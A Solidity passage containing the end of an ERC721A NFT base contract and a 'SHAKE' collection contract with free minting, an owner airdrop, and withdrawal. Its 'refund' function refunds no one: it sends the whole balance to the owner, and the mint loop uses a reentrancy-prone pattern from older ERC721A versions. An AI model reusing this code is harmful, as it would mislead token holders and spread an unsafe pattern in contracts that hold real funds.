1088         // Overflows are incredibly unrealistic.
1089         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1090         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1091         unchecked {
1092             _addressData[to].balance += uint128(quantity);
1093             _addressData[to].numberMinted += uint128(quantity);
1094 
1095             _ownerships[startTokenId].addr = to;
1096             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1097 
1098             uint256 updatedIndex = startTokenId;
1099 
1100             for (uint256 i; i < quantity; i++) {
1101                 emit Transfer(address(0), to, updatedIndex);
1102                 if (safe) {
1103                     require(
1104                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1105                         "ERC721A: transfer to non ERC721Receiver implementer"
1106                     );
1107                 }
1108 
1109                 updatedIndex++;
1110             }
1111 
1112             currentIndex = updatedIndex;
1113         }
1114 
1115         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1116     }
1117 
1118     /**
1119      * @dev Transfers `tokenId` from `from` to `to`.
1120      *
1121      * Requirements:
1122      *
1123      * - `to` cannot be the zero address.
1124      * - `tokenId` token must be owned by `from`.
1125      *
1126      * Emits a {Transfer} event.
1127      */
1128     function _transfer(
1129         address from,
1130         address to,
1131         uint256 tokenId
1132     ) private {
1133         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1134 
1135         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1136             getApproved(tokenId) == _msgSender() ||
1137             isApprovedForAll(prevOwnership.addr, _msgSender()));
1138 
1139         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1140 
1141         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1142         require(to != address(0), "ERC721A: transfer to the zero address");
1143 
1144         _beforeTokenTransfers(from, to, tokenId, 1);
1145 
1146         // Clear approvals from the previous owner
1147         _approve(address(0), tokenId, prevOwnership.addr);
1148 
1149         // Underflow of the sender's balance is impossible because we check for
1150         // ownership above and the recipient's balance can't realistically overflow.
1151         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1152         unchecked {
1153             _addressData[from].balance -= 1;
1154             _addressData[to].balance += 1;
1155 
1156             _ownerships[tokenId].addr = to;
1157             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1158 
1159             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1160             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1161             uint256 nextTokenId = tokenId + 1;
1162             if (_ownerships[nextTokenId].addr == address(0)) {
1163                 if (_exists(nextTokenId)) {
1164                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1165                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1166                 }
1167             }
1168         }
1169 
1170         emit Transfer(from, to, tokenId);
1171         _afterTokenTransfers(from, to, tokenId, 1);
1172     }
1173 
1174     /**
1175      * @dev Approve `to` to operate on `tokenId`
1176      *
1177      * Emits a {Approval} event.
1178      */
1179     function _approve(
1180         address to,
1181         uint256 tokenId,
1182         address owner
1183     ) private {
1184         _tokenApprovals[tokenId] = to;
1185         emit Approval(owner, to, tokenId);
1186     }
1187 
1188     /**
1189      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1190      * The call is not executed if the target address is not a contract.
1191      *
1192      * @param from address representing the previous owner of the given token ID
1193      * @param to target address that will receive the tokens
1194      * @param tokenId uint256 ID of the token to be transferred
1195      * @param _data bytes optional data to send along with the call
1196      * @return bool whether the call correctly returned the expected magic value
1197      */
1198     function _checkOnERC721Received(
1199         address from,
1200         address to,
1201         uint256 tokenId,
1202         bytes memory _data
1203     ) private returns (bool) {
1204         if (to.isContract()) {
1205             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1206                 return retval == IERC721Receiver(to).onERC721Received.selector;
1207             } catch (bytes memory reason) {
1208                 if (reason.length == 0) {
1209                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1210                 } else {
1211                     assembly {
1212                         revert(add(32, reason), mload(reason))
1213                     }
1214                 }
1215             }
1216         } else {
1217             return true;
1218         }
1219     }
1220 
1221     /**
1222      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1223      *
1224      * startTokenId - the first token id to be transferred
1225      * quantity - the amount to be transferred
1226      *
1227      * Calling conditions:
1228      *
1229      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1230      * transferred to `to`.
1231      * - When `from` is zero, `tokenId` will be minted for `to`.
1232      */
1233     function _beforeTokenTransfers(
1234         address from,
1235         address to,
1236         uint256 startTokenId,
1237         uint256 quantity
1238     ) internal virtual {}
1239 
1240     /**
1241      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1242      * minting.
1243      *
1244      * startTokenId - the first token id to be transferred
1245      * quantity - the amount to be transferred
1246      *
1247      * Calling conditions:
1248      *
1249      * - when `from` and `to` are both non-zero.
1250      * - `from` and `to` are never both zero.
1251      */
1252     function _afterTokenTransfers(
1253         address from,
1254         address to,
1255         uint256 startTokenId,
1256         uint256 quantity
1257     ) internal virtual {}
1258 }
1259 
1260 contract SHAKE  is ERC721A, Ownable, ReentrancyGuard {
1261     string public baseURI = "ipfs://QmNrecBqVPMo5HY4jkxFv6VQroeoh3g7NmLZEDWtUHZSPY/";
1262     uint   public price             = 0.003 ether;
1263     uint   public maxPerTx          = 20;
1264     uint   public maxPerFree        = 1;
1265     uint   public totalFree         = 4000;
1266     uint   public maxSupply         = 4000;
1267 
1268     mapping(address => uint256) private _mintedFreeAmount;
1269 
1270     constructor() ERC721A("SHAKESHAKE", "SK"){}
1271 
1272 
1273     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1274         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1275         string memory currentBaseURI = _baseURI();
1276         return bytes(currentBaseURI).length > 0
1277             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1278             : "";
1279     }
1280 
1281     function mint(uint256 count) external payable {
1282         uint256 cost = price;
1283         bool isFree = ((totalSupply() + count < totalFree + 1) &&
1284             (_mintedFreeAmount[msg.sender] + count <= maxPerFree));
1285 
1286         if (isFree) {
1287             cost = 0;
1288             _mintedFreeAmount[msg.sender] += count;
1289         }
1290 
1291         require(msg.value >= count * cost, "Please send the exact amount.");
1292         require(totalSupply() + count <= maxSupply, "No more");
1293         require(count <= maxPerTx, "Max per TX reached.");
1294 
1295         _safeMint(msg.sender, count);
1296     }
1297 
1298     function Airdrop(address mintAddress, uint256 count) public onlyOwner {
1299         _safeMint(mintAddress, count);
1300     }
1301 
1302 
1303 
1304     function _baseURI() internal view virtual override returns (string memory) {
1305         return baseURI;
1306     }
1307 
1308     function setBaseUri(string memory baseuri_) public onlyOwner {
1309         baseURI = baseuri_;
1310     }
1311 
1312     function setPrice(uint256 price_) external onlyOwner {
1313         price = price_;
1314     }
1315 
1316     function withdraw() external onlyOwner nonReentrant {
1317         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1318         require(success, "Transfer failed.");
1319     }
1320 
1321     function refund() external onlyOwner nonReentrant {
1322         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1323         require(success, "Transfer failed.");
1324     }   
1325 
1326 
1327 }